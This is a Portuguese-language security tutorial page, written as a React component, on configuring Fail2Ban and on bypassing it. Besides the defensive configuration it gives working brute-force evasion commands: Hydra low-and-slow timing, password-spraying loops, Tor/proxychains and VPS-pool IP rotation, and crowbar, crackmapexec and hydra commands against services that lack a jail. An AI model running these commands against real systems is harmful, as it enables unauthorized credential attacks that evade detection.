import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Fail2Ban() {
  return (
    <PageContainer
      title="Fail2Ban"
      subtitle="Bane IPs que fazem brute force lendo logs em tempo real. Como configurar — e como passar por baixo dele com low-and-slow + proxy chains."
      difficulty="intermediario"
      timeToRead="18 min"
    >
      <h2>Como funciona</h2>
      <p>
        <strong>Fail2Ban</strong> é um daemon Python que <em>tail -f</em> nos logs de
        serviços (sshd, nginx, postfix, vsftpd...) e, quando casa um regex de falha N vezes
        em uma janela de tempo, dispara uma <strong>action</strong> — tipicamente adicionar
        regra <code>iptables/nftables DROP</code> contra o IP origem por X minutos.
      </p>
      <p>
        É a mitigação mais barata contra brute-force credentialless. Pra você como
        <strong>red team</strong>, é <em>obstáculo</em>: dispara após poucos erros e te
        deixa cego no alvo. Você passa por ele com (1) <strong>low-and-slow</strong>
        respeitando <code>findtime</code>, (2) <strong>distribuição via proxychains</strong>
        ou múltiplos VPS, ou (3) atacando o <em>protocolo</em> que não está coberto por
        jail.
      </p>

      <h2>Instalar e habilitar</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y fail2ban",
            out: "Setting up fail2ban (1.0.2-2) ... Created symlink fail2ban.service.",
            outType: "success",
          },
          {
            cmd: "sudo systemctl enable --now fail2ban",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "sudo systemctl status fail2ban --no-pager | head -8",
            out: `● fail2ban.service - Fail2Ban Service
     Loaded: loaded (/lib/systemd/system/fail2ban.service; enabled)
     Active: active (running) since Sun 2026-04-05 08:14:21 -03; 5s ago
       Docs: man:fail2ban(1)
   Main PID: 4912 (f2b/server)
      Tasks: 5 (limit: 9418)
     Memory: 14.6M
     CGroup: /system.slice/fail2ban.service
             └─4912 /usr/bin/python3 /usr/bin/fail2ban-server -xf start`,
            outType: "info",
          },
        ]}
      />

      <AlertBox type="warning" title="Sempre edite jail.local — nunca jail.conf">
        <p>
          O arquivo <code>/etc/fail2ban/jail.conf</code> vem com o pacote e é
          <strong>sobrescrito em update</strong>. Sua config vive em
          <code>/etc/fail2ban/jail.local</code> ou em fragmentos
          <code>/etc/fail2ban/jail.d/*.conf</code> que sobrescrevem.
        </p>
      </AlertBox>

      <h2>Config mínima — jail.local</h2>
      <CodeBlock
        language="ini"
        title="/etc/fail2ban/jail.local"
        code={`[DEFAULT]
# IPs que NUNCA são banidos (admin, monitor, escritório)
ignoreip = 127.0.0.1/8 ::1 10.10.10.0/24

# janela de observação: olha falhas dos últimos 10 minutos
findtime = 10m

# 5 falhas dentro da findtime = ban
maxretry = 5

# duração do ban (use -1 pra permanente)
bantime  = 1h

# acelerador: cada reincidência multiplica o bantime
bantime.increment = true
bantime.factor    = 2
bantime.maxtime   = 7d

# action padrão (firewall)
banaction = nftables-multiport
banaction_allports = nftables-allports

# pra mandar email (opcional)
destemail = sec@empresa.com
sender    = fail2ban@empresa.com
mta       = sendmail
action    = %(action_mwl)s

##
## Jails
##

[sshd]
enabled  = true
port     = ssh
logpath  = %(sshd_log)s
backend  = systemd

[nginx-http-auth]
enabled  = true
port     = http,https
logpath  = /var/log/nginx/error.log

[nginx-botsearch]
enabled  = true
port     = http,https
logpath  = /var/log/nginx/access.log
maxretry = 2

[postfix-sasl]
enabled  = true
port     = smtp,465,submission
logpath  = %(postfix_log)s

[recidive]
# mete cadeia em IP que apareceu em vários jails diferentes
enabled  = true
logpath  = /var/log/fail2ban.log
bantime  = 1w
findtime = 1d
maxretry = 3`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "depois de editar, recarrega",
            cmd: "sudo systemctl reload fail2ban",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            comment: "valida sintaxe sem aplicar",
            cmd: "sudo fail2ban-client -t",
            out: `OK: configuration test is successful`,
            outType: "success",
          },
        ]}
      />

      <h2>fail2ban-client — operação</h2>
      <CommandTable
        title="comandos do dia a dia"
        variations={[
          { cmd: "fail2ban-client status", desc: "Lista jails ativos.", output: "Number of jail: 4\\n`- Jail list: nginx-http-auth, postfix-sasl, recidive, sshd" },
          { cmd: "fail2ban-client status sshd", desc: "Status detalhado de um jail (file pos, banidos, total).", output: "Currently banned: 3\\nTotal banned: 47\\nBanned IP list: 192.168.1.50 203.0.113.7 198.51.100.12" },
          { cmd: "fail2ban-client set sshd unbanip 203.0.113.7", desc: "Remove IP da lista de banidos.", output: "1" },
          { cmd: "fail2ban-client set sshd banip 203.0.113.99", desc: "Bane manualmente.", output: "1" },
          { cmd: "fail2ban-client set sshd addignoreip 10.10.10.5", desc: "Adiciona IP à whitelist em runtime.", output: "1" },
          { cmd: "fail2ban-client reload", desc: "Recarrega config sem reiniciar daemon.", output: "OK" },
          { cmd: "fail2ban-client reload sshd", desc: "Recarrega só um jail.", output: "OK" },
          { cmd: "fail2ban-client unban --all", desc: "Limpa TODOS os bans (útil em emergência).", output: "47" },
          { cmd: "fail2ban-regex /var/log/auth.log /etc/fail2ban/filter.d/sshd.conf", desc: "Testa filter contra log real — debug essencial.", output: "Lines: 1234 lines, 0 ignored, 47 matched, 1187 missed" },
        ]}
      />

      <h2>Filters e Actions</h2>
      <p>
        Cada jail combina um <strong>filter</strong> (regex que casa "falha" no log) com
        uma <strong>action</strong> (o que fazer ao banir). Filters vivem em
        <code>/etc/fail2ban/filter.d/*.conf</code>; actions em
        <code>/etc/fail2ban/action.d/*.conf</code>.
      </p>

      <CodeBlock
        language="ini"
        title="/etc/fail2ban/filter.d/sshd-custom.conf"
        code={`[INCLUDES]
before = common.conf

[Definition]
# casa "Failed password" e "Invalid user" no auth.log
failregex = ^%(__prefix_line)sFailed (?:password|publickey) for .* from <HOST>(?: port \\d+)?(?: ssh\\d*)?\\s*$
            ^%(__prefix_line)sInvalid user .* from <HOST>(?: port \\d+)?\\s*$
            ^%(__prefix_line)sUser .* from <HOST> not allowed because not listed in AllowUsers\\s*$

ignoreregex =

# datepattern usado pra parsear timestamp
datepattern = {^LN-BEG}EPOCH
              ^%%b %%d %%H:%%M:%%S
              {^LN-BEG}`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "testa o filter — quantas linhas casam?",
            cmd: "sudo fail2ban-regex /var/log/auth.log /etc/fail2ban/filter.d/sshd.conf",
            out: `Running tests
=============

Use   failregex filter file : sshd, basedir: /etc/fail2ban
Use         log file : /var/log/auth.log

Results
=======

Failregex: 47 total
|-  #) [# of hits] regular expression
|   1) [12] ^%(__prefix_line)sFailed (?:password|publickey) for .* from <HOST>...
|   2) [35] ^%(__prefix_line)sInvalid user .* from <HOST>...
'-

Date template hits:
|- [date pattern] [# of hits]
|  {^LN-BEG}EPOCH                       :  0
|  ^%b %d %H:%M:%S                      :  1234
'-

Lines: 1234 lines, 0 ignored, 47 matched, 1187 missed`,
            outType: "info",
          },
        ]}
      />

      <h2>━━━ Defesa: jail customizado pra app web ━━━</h2>
      <p>Sua app retorna 401 em login errado? Crie filter próprio:</p>
      <CodeBlock
        language="ini"
        title="/etc/fail2ban/filter.d/myapp-login.conf"
        code={`[Definition]
failregex = ^<HOST> .* "POST /api/login HTTP.*" 401
ignoreregex = `}
      />
      <CodeBlock
        language="ini"
        title="/etc/fail2ban/jail.d/myapp.conf"
        code={`[myapp-login]
enabled  = true
filter   = myapp-login
port     = http,https
logpath  = /var/log/nginx/myapp-access.log
maxretry = 5
findtime = 5m
bantime  = 30m`}
      />

      <h2>━━━ Ataque: enumerar Fail2Ban no alvo ━━━</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "primeiro: confirme que existe",
            cmd: "nmap -p22 --script ssh-brute --script-args 'brute.firstonly=true,unpwdb.timelimit=10s' 10.10.10.50",
            out: `PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute:
|_  ERROR: Failed to retrieve server fingerprint after authentication attempts. (Connection refused)`,
            outType: "warning",
          },
          {
            comment: "se a 5ª tentativa começa a dar 'Connection refused' enquanto a porta antes respondia, é Fail2Ban (ou crowdsec)",
            cmd: "for i in 1 2 3 4 5 6 7; do nc -zv -w2 10.10.10.50 22 2>&1; sleep 1; done",
            out: `Connection to 10.10.10.50 22 port [tcp/ssh] succeeded!
Connection to 10.10.10.50 22 port [tcp/ssh] succeeded!
Connection to 10.10.10.50 22 port [tcp/ssh] succeeded!
Connection to 10.10.10.50 22 port [tcp/ssh] succeeded!
Connection to 10.10.10.50 22 port [tcp/ssh] succeeded!
nc: connect to 10.10.10.50 port 22 (tcp) failed: Connection timed out
nc: connect to 10.10.10.50 port 22 (tcp) failed: Connection timed out`,
            outType: "error",
          },
        ]}
      />

      <h2>━━━ Ataque 1: Low-and-slow ━━━</h2>
      <p>
        Default do jail sshd: <code>maxretry=5</code> em <code>findtime=10m</code>. Se você
        tenta <strong>4 senhas a cada 10 minutos</strong>, nunca dispara o ban. É lento, mas
        funciona em ataques de longa duração (madrugada toda) ou com password spraying
        (1 senha contra muitos users).
      </p>
      <Terminal
        path="~"
        lines={[
          {
            comment: "hydra com -t 1 (1 thread) e -W 150 (espera 150s entre tentativas)",
            cmd: "hydra -L users.txt -P top10.txt -t 1 -W 150 -f ssh://10.10.10.50",
            out: `Hydra v9.5 starting at 2026-04-05 03:42:11
[STATUS] 6.00 tries/min, 6 tries in 00:01h, 994 to do in 02:46h
[22][ssh] host: 10.10.10.50   login: backup   password: backup123
[STATUS] attack finished
1 of 1 target successfully completed, 1 valid password found`,
            outType: "success",
          },
          {
            comment: "spray: 1 senha por user, espaçado — não dispara findtime por user",
            cmd: "for u in $(cat users.txt); do hydra -l $u -p 'Welcome2024!' ssh://10.10.10.50 -t 1; sleep 60; done",
            out: "(continua silenciosamente)",
            outType: "muted",
          },
        ]}
      />

      <h2>━━━ Ataque 2: Distribuir via proxychains / múltiplos IPs ━━━</h2>
      <p>
        Fail2Ban bane <strong>por IP origem</strong>. Se cada tentativa vem de IP diferente,
        nunca acumula <code>maxretry</code>.
      </p>
      <Terminal
        path="~"
        lines={[
          {
            comment: "configura proxychains com lista de SOCKS Tor + open proxies",
            cmd: "cat /etc/proxychains4.conf | grep -A20 'ProxyList'",
            out: `[ProxyList]
socks5  127.0.0.1 9050
socks5  127.0.0.1 9051
socks5  127.0.0.1 9052
# random_chain + chain_len = 1 → muda IP a cada call`,
            outType: "info",
          },
          {
            comment: "tor multi-circuit: cada conexão vai por exit node diferente",
            cmd: "proxychains4 -q hydra -L users.txt -P passwords.txt -t 1 -W 5 ssh://10.10.10.50",
            out: `[STATUS] 12.00 tries/min — IP origem rotaciona pelos exit nodes`,
            outType: "warning",
          },
          {
            comment: "alternativa cara mas eficaz: pool de VPS",
            cmd: "for ip in $(cat my_vps.txt); do ssh attacker@$ip 'hydra ... &'; done",
            out: "(20 VPS atacando paralelo, cada um <maxretry — Fail2Ban inerte)",
            outType: "default",
          },
        ]}
      />

      <h2>━━━ Ataque 3: jail incompleto ━━━</h2>
      <p>
        Muita gente liga só o <code>[sshd]</code> e esquece o resto. Procure portas onde
        Fail2Ban <strong>não</strong> está olhando:
      </p>
      <CommandTable
        title="vetores frequentemente sem jail"
        variations={[
          { cmd: "FTP/FTPS (vsftpd, proftpd)", desc: "Tem jail nativo mas raramente habilitado.", output: "hydra ftp://target" },
          { cmd: "RDP (xrdp)", desc: "Sem filter por padrão.", output: "crowbar -b rdp -s 10.10.10.50/32 -u admin -C pass.txt" },
          { cmd: "MySQL/Postgres", desc: "Quase ninguém configura jail pra DB.", output: "hydra -L u.txt -P p.txt mysql://target" },
          { cmd: "SMB", desc: "Filter existe (filter.d/samba.conf) mas raro.", output: "crackmapexec smb target -u u.txt -p p.txt --continue-on-success" },
          { cmd: "Webapp custom", desc: "Endpoints /login específicos sem jail dedicado.", output: "ffuf, hydra http-post-form, etc." },
        ]}
      />

      <h2>━━━ Defesa: Recidive + escalada ━━━</h2>
      <p>
        O jail <code>[recidive]</code> lê o próprio <code>/var/log/fail2ban.log</code>:
        IPs que apareceram em <em>vários</em> jails diferentes ou foram banidos
        repetidamente ganham um ban longo (1 semana+). Mata o atacante low-and-slow que
        fica voltando.
      </p>
      <CodeBlock
        language="ini"
        title="reforço: bloquear TODAS as portas para reincidente"
        code={`[recidive]
enabled    = true
logpath    = /var/log/fail2ban.log
banaction  = nftables-allports
bantime    = 4w
findtime   = 1d
maxretry   = 5`}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo fail2ban-client status recidive",
            out: `Status for the jail: recidive
|- Filter
|  |- Currently failed: 0
|  |- Total failed:     38
|  '- File list:        /var/log/fail2ban.log
'- Actions
   |- Currently banned: 7
   |- Total banned:     12
   '- Banned IP list:   45.142.121.5 89.248.165.74 185.220.101.18 ...`,
            outType: "warning",
          },
        ]}
      />

      <PracticeBox
        title="Lab: simule brute force, observe ban e teste bypass low-and-slow"
        goal="Configurar Fail2Ban com jail SSH agressivo (maxretry=3) e validar que (1) hydra normal é banido em segundos e (2) hydra com -W 200 passa."
        steps={[
          "Edite /etc/fail2ban/jail.local com [sshd] enabled=true, maxretry=3, findtime=2m, bantime=10m.",
          "Recarregue fail2ban-client reload.",
          "Em outro shell rode hydra agressivo — esperar ban.",
          "Confirme com fail2ban-client status sshd.",
          "Unban e tente novamente com -t 1 -W 60 (1 tentativa por minuto).",
          "Veja que NÃO bane.",
        ]}
        command={`# 1) ataque rápido — VAI ser banido
hydra -l fakeuser -P /usr/share/wordlists/rockyou.txt -t 4 ssh://127.0.0.1
sudo fail2ban-client status sshd

# 2) unban e refaz devagar
sudo fail2ban-client set sshd unbanip <SEU_IP>
hydra -l fakeuser -P pequena.txt -t 1 -W 60 ssh://127.0.0.1`}
        expected={`Status for the jail: sshd
|- Filter
|  |- Currently failed: 0
|  '- Total failed:     17
'- Actions
   |- Currently banned: 1
   '- Banned IP list:   127.0.0.1
   ...
# Já no segundo run (-W 60), nenhum ban registrado.`}
        verify="A diferença entre os dois runs prova o conceito de findtime/maxretry. Em pentest real, ajuste -W ao findtime do alvo (10m default = -W 150)."
      />

      <AlertBox type="info" title="Fail2Ban + CrowdSec + GeoIP = stack moderno">
        <p>
          Para cobrir o gap de bypass distribuído, combine Fail2Ban com
          <code>crowdsec</code> (compartilha listas de IPs maliciosos entre instâncias) e
          GeoIP-blocking via <code>nftables</code> set para países fora do escopo. Pra
          atacante isso significa: comprar VPS dentro do mesmo país do alvo é vantagem,
          e Tor/proxies passam a ser <em>ruido</em> imediatamente bloqueado.
        </p>
      </AlertBox>
    </PageContainer>
  );
}
